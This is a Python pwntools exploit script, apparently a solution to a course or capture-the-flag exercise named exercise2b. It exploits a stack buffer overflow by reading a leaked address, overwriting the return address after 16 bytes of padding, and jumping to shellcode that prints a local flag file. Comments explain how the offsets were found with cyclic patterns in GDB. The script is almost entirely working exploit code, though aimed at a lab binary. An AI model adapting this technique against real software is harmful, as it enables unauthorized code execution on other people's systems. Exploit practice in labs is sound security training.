#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise2/exercise2b'
#exe = './exercise2b'
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

shellcode = asm(shellcraft.amd64.linux.cat("./flag"))

r = start()
#buf = r.recvline()
#print(buf)
buf = r.recv(numb=14) # after that, it becomes \nEnter the secret password
# cyclic 512 => GDB => start, continue, fill in cyclic 512
# find  ("caaadaaa"?) => 'caaa' => cyclic -l caaa => 8
# 'caac' => 8 => p32 + p32 (other 8 bits like the last question) needs to be filled => 16 with paddings
# return address:  stopped 0x401217 in check_authorization ()
# => return 0x401218 (first four digits are dismissed) since we are looking at the small space  => 0x18
shellcode = b'A'*16 + p64(int(buf[2:], 16) + 0x18) + shellcode
r.sendline(shellcode)
print(r.recvall().decode())